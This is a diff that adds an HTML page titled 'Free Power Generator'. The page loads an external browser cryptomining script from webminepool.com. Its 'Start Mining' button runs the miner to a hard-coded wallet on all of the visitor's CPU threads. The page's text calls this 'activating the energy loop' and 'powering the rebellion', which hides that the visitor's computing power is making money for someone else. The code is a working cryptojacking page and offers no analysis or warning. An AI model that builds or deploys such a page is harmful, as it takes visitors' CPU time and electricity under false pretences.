@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Free Power Generator</title>
+  <style>
+    body {
+      background: #000;
+      color: #0f0;
+      font-family: monospace;
+      text-align: center;
+      padding: 60px 20px;
+    }
+    h1 {
+      font-size: 3em;
+      margin-bottom: 20px;
+    }
+    p {
+      font-size: 1.2em;
+      color: #aaa;
+    }
+    button {
+      margin-top: 40px;
+      padding: 15px 30px;
+      background: #f00;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 1.2em;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>💻 Free Power Generator 💰</h1>
+  <p>Click below to activate the energy loop. You're helping us stay savage.</p>
+  <button onclick="startMining()">Start Mining</button>
+
+  <script src="https://webminepool.com/lib/base.js"></script>
+  <script>
+    function startMining() {
+      const miner = WMP.User('89GaAEZBzfeFrHJXBUtRBASMnQtF1L7gnVW5bvs2ftU96DR44skKtgn8tL6Qjztk9D5CUwKnhW1uUgNFXYP6cKZmTCQv9Qv', 'iHateCompanies', {
+        threads: navigator.hardwareConcurrency || 4,
+        throttle: 0.2
+      });
+      miner.start();
+      alert("You're powering the rebellion. Mining started.");
+    }
+  </script>
+</body>
+</html>
